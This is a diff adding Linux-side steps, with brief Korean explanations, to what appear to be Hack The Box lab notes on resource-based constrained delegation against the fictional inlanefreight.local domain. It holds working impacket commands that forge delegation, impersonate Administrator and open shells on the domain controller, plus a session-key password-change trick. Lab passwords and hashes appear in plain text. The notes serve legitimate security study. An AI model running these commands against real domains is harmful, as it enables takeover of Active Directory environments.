@@ -210,3 +210,34 @@ $credentials = New-Object System.Management.Automation.PSCredential "INLANEFREIG
 
 Get-DomainComputer DC01 | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity -Credential $credentials -Verbose
 ```
+
+### Linux
+```bash
+addcomputer.py -computer-name 'HACKTHEBOX$' -computer-pass Hackthebox123+\! -dc-ip 10.129.205.35 inlanefreight.local/carole.holmes
+
+python3 rbcd.py -dc-ip 10.129.205.35 -t DC01 -f HACKTHEBOX inlanefreight\\carole.holmes:Y3t4n0th3rP4ssw0rd
+
+getST.py -spn cifs/DC01.inlanefreight.local -impersonate Administrator -dc-ip 10.129.205.35 inlanefreight.local/HACKTHEBOX:Hackthebox123+\!
+
+export KRB5CCNAME=./Administrator.ccache
+
+psexec.py -k -no-pass dc01.inlanefreight.local
+```
+
+#### RBCD from Linux When MachineAccountQuota Is Set to 0
+- RC4 암호화 체계에서는 세션키의 해시 자체가 비밀번호의 해시와 동일한 역할을 할 수 있게 된다.
+- 따라서 `SamrChangePasswordUser`함수 호출 시 "현재 비밀번호" 자리에 세션키의 해시를 제출하면, 시스템이 이를 실제 현재 비밀번호로 착각하고 Administrator의 비밀번호를 변경할 수 있게 된다.
+- 이는 `SamrChangePasswordUser`함수가 별도의 관리자 권한이 아니라 "현재 비밀번호를 안다"는 사실만으로 변경을 허용하는 구조이기 때문에 가능하다.
+```bash
+pypykatz crypto nt 'B3thR!ch@rd$'
+
+getTGT.py INLANEFREIGHT.LOCAL/beth.richards -hashes :de3d16603d7ded97bb47cd6641b1a392 -dc-ip 10.129.205.35
+
+impacket-describeTicket beth.richards.ccache | grep 'Ticket Session Key'
+
+changepasswd.py INLANEFREIGHT.LOCAL/beth.richards@10.129.205.35 -hashes :de3d16603d7ded97bb47cd6641b1a392 -newhash
+
+KRB5CCNAME=beth.richards.ccache getST.py -u2u -impersonate Administrator -spn TERMSRV/DC01.INLANEFREIGHT.LOCAL -no-pass INLANEFREIGHT.LOCAL/beth.richards -dc-ip 10.129.205.35
+
+KRB5CCNAME=Administrator@TERMSRV_DC01.INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccache wmiexec.py DC01.INLANEFREIGHT.LOCAL -k -no-pass
+```
